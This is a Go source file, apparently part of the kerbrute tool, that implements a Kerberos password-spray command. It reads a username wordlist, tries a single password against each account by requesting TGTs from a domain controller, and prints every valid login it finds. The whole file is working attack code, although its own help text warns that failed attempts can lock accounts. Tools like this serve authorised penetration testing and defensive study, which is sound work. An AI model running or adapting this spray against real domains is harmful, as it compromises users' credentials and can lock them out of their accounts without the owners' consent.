package cmd

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"github.com/ropnop/kerbrute/util"

	"github.com/spf13/cobra"
)

var usernameList string
var password string

var passwordSprayCmd = &cobra.Command{
	Use:   "passwordspray [flags] <username_wordlist> <password>",
	Short: "Test a single password against a list of users",
	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Succesful logins will be displayed on stdout.
WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args:   cobra.ExactArgs(2),
	PreRun: setupSession,
	Run:    passwordSpray,
}

func init() {
	rootCmd.AddCommand(passwordSprayCmd)
}

func passwordSpray(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	password := args[1]

	file, err := os.Open(usernamelist)
	if err != nil {
		logger.Log.Error(err.Error())
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	var username string
	count, success := 0, 0
	start := time.Now()
	for scanner.Scan() {
		count++
		usernameline := scanner.Text()
		username, err = util.FormatUsername(usernameline)
		if err != nil {
			logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
			continue
		}
		login := fmt.Sprintf("%v@%v", username, domain)
		if ok, err := kSession.TestLogin(username, password); ok {
			success++
			logger.Log.Noticef("[+] VALID LOGIN:\t %s : %s", login, password)
		} else {
			// This is to determine if the error is "okay" or if we should abort everything
			ok, errorString := kSession.HandleKerbError(err)
			if !ok {
				logger.Log.Errorf("[!] %v - %v", login, errorString)
				return
			}
			logger.Log.Debugf("[!] %v - %v", login, errorString)
		}
	}

	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", count, success, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}

}
